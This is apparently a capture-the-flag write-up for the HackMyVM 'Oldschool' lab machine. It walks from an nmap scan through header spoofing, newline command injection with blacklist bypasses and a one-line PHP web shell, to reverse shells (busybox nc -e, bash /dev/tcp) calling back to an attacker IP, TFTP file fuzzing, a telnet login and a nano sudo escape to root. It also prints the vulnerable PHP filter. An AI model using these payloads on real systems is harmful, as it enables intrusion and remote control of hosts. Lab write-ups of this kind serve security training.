# Oldschool

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.175:23
Open 10.0.2.175:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.175
PORT   STATE SERVICE REASON  VERSION
23/tcp open  telnet  syn-ack Linux telnetd
80/tcp open  http    syn-ack Apache httpd 2.4.54 ((Debian))
|_http-title: 2000's Style Website
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.54 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP

![writeup.png](/assets/pentest/hackmyvm/oldschool/writeup.png)

```bash
└─$ curl http://10.0.2.175/verification.php -iL
HTTP/1.1 302 Found
Date: Mon, 05 Jan 2026 15:22:37 GMT
Server: Apache/2.4.54 (Debian)
Role: not admin
Location: ./denied.php
Content-Length: 0
Content-Type: text/html; charset=UTF-8

HTTP/1.1 200 OK
Date: Mon, 05 Jan 2026 15:22:37 GMT
Server: Apache/2.4.54 (Debian)
Vary: Accept-Encoding
Content-Length: 240
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title>Access denied</title>
  </head>
  <body>
<img src="https://media.giphy.com/media/i5026ewDb0WRitJEu1/giphy.gif" alt="bug"  width="100%" eight:"100%" />
  </body>
</html>
```

`Role: not admin` header is very unusual...
```bash
└─$ curl http://10.0.2.175/verification.php -H 'Role: admin'
...
window.location.href = './pingertool2000.php';
...
```

I didn't try valid IP first, anything results in `Attack detected`. Needs some kind of header or secret value?

![writeup-1.png](/assets/pentest/hackmyvm/oldschool/writeup-1.png)

### RCE

Oh well, it needed protocol prefix... Newline injection is successful for RCE
```bash
└─$ curl 'http://10.0.2.175/pingertool2000.php' -d 'url=http://0%0Aid' -s | htmlq pre -tw
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Most commands are blocked
```bash
└─$ curl 'http://10.0.2.175/pingertool2000.php' --data-urlencode $'url=http://0\nbusybox nc 10.0.2.149 4444' -s | htmlq pre -tw
Attack detected: nc is forbidden
```

```bash
└─$ curl 'http://10.0.2.175/pingertool2000.php' --data-urlencode $'url=http://0\n/bin/bash -c "/bin/bash -i >&/dev/tcp/10.0.2.149/4444 0>&1"' -s | htmlq pre -tw
Attack detected: bash is forbidden
```

I decided to upload a webshell, after some struggle this was the payload
```bash
└─$ curl 'http://10.0.2.175/pingertool2000.php' --data-urlencode $'url=http://0\nprintf$IFS\'<?=`$_REQUEST[0]`?>\'>t2.phtml' -s | htmlq pre -tw
```

![writeup-2.png](/assets/pentest/hackmyvm/oldschool/writeup-2.png)

You can also do base64 and quotes fuckery
```bash
└─$ curl 'http://10.0.2.175/pingertool2000.php' --data-urlencode $'url=http://0\nprintf$IFS"aWQK"|base64$IFS-d|s""h' -s | htmlq pre -tw
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```bash
└─$ curl 'http://10.0.2.175/t2.phtml' --data-urlencode '0=busybox nc 10.0.2.149 4444 -e /bin/bash'
---
└─$ penelope -p 4444
www-data@oldschool:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The script looks something like this:
```php
<?php
error_reporting(0);

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $url = $_POST["url"];

    // 1. First Defense: Check if the first character is alphanumeric
    if (!ctype_alpha($url[0])) {
        echo "Attack detected <br><br> ╮⊂⊃╭(Ο_Ο)╯⊂⊃╮";
        exit;
    }

    // 2. Second Defense: Blacklisted commands
    $forbidden = [
        "cat", "ls", "whoami", "nc", "telnet", "bash", "python", "sh", 
        "curl", "ss", "netstat", "php", "perl", "ruby", "netcat", "awk", 
        "echo", "passwd", "wget", "cp", "pingertool2000"
    ];

    foreach ($forbidden as $cmd) {
        if (strpos($url, $cmd) !== false) {
            echo "Attack detected: {$cmd} is forbidden <br><br> ╮⊂⊃╭(Ο_Ο)╯⊂⊃╮";
            exit;
        }
    }

    // 3. Third Defense: Special character regex
    // Checks for: [space], ;, *, (, ), #, &
    if (preg_match("/[ ;*()#&]/", $url)) {
        echo "Attack detected <br><br> ╮⊂⊃╭(Ο_Ο)╯⊂⊃╮";
        exit;
    }

    // 4. Execution
    $output = shell_exec("ping -c 1 -W 1 {$url}");
    echo $output;
}
?>
```

## Lateral Movement

```bash
www-data@oldschool:/$ ss -tulp
Netid   State    Recv-Q   Send-Q     Local Address:Port         Peer Address:Port   Process
udp     UNCONN   0        0                0.0.0.0:bootpc            0.0.0.0:*
udp     UNCONN   0        0                0.0.0.0:tftp              0.0.0.0:*
udp     UNCONN   0        0              127.0.0.1:snmp              0.0.0.0:*
udp     UNCONN   0        0                   [::]:tftp                 [::]:*
tcp     LISTEN   0        128              0.0.0.0:telnet            0.0.0.0:*
tcp     LISTEN   0        511                    *:http                    *:*
```

```bash
www-data@oldschool:/home/fanny$ ps aux | grep ftp
root         495  0.0  0.0   4872   300 ?        Ss   16:20   0:00 /usr/sbin/in.tftpd --listen --user fanny --address :69 --secure /srv/tftp
```

- [https://blog.1nf1n1ty.team/hacktricks/network-services-pentesting/69-udp-tftp](https://blog.1nf1n1ty.team/hacktricks/network-services-pentesting/69-udp-tftp)

Idk why `nmap` sees the port as closed
```bash
└─$ nmap -n -Pn -sU -p69 -sV --script tftp-enum 10.0.2.175
69/udp closed tftp
└─$ nc -zvu 10.0.2.175 69
[10.0.2.175] 69 (tftp) open
```

Fuzz files manually
```
└─$ while read -r file; do echo $file; timeout 1 tftp 10.0.2.175 -c get $file; done < /usr/share/nmap/nselib/data/tftplist.txt
└─$ find . -empty -delete
└─$ ls -lAh
Permissions Size User  Date Modified Name
.rw-rw-r--   104 woyag  5 Jan 12:08  󱁻 passwd.cfg
└─$ cat passwd.cfg
# lesspass default config password generator
# do not delete
lesspass oldschool.hmv fanny 14mw0nd32fu1
```

- **[lesspass](https://github.com/lesspass/lesspass)**
- [https://www.lesspass.com](https://www.lesspass.com)

![writeup-3.png](/assets/pentest/hackmyvm/oldschool/writeup-3.png)

## Telnet

```bash
└─$ telnet 10.0.2.175 23
oldschool.hmv login: fanny
Password: 44Tg".P0/jKo_'t:
fanny@oldschool:~$ id
uid=1001(fanny) gid=1001(fanny) groups=1001(fanny)
```

### User.txt

```bash
fanny@oldschool:~$ cat user.txt
a8a1d4b692341fc2c59ca33815fb59d6
```

## Privilege Escalation

```bash
fanny@oldschool:~$ sudo -l
Matching Defaults entries for fanny on oldschool:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User fanny may run the following commands on oldschool:
    (ALL : ALL) NOPASSWD: /usr/bin/nano /etc/snmp/snmpd.conf
```

- [https://gtfobins.github.io/gtfobins/nano/#sudo](https://gtfobins.github.io/gtfobins/nano/#sudo)

```bash
fanny@oldschool:~$ sudo /usr/bin/nano /etc/snmp/snmpd.conf
# Press: ^R^X
reset; bash 1>&0 2>&0
```

```bash
root@oldschool:/home/fanny# id
uid=0(root) gid=0(root) groups=0(root)
```

### Root.txt

```bash
root@oldschool:/home/fanny# cat /root/root.txt
2b812156175effb8b80c6a65f8ef3a21
```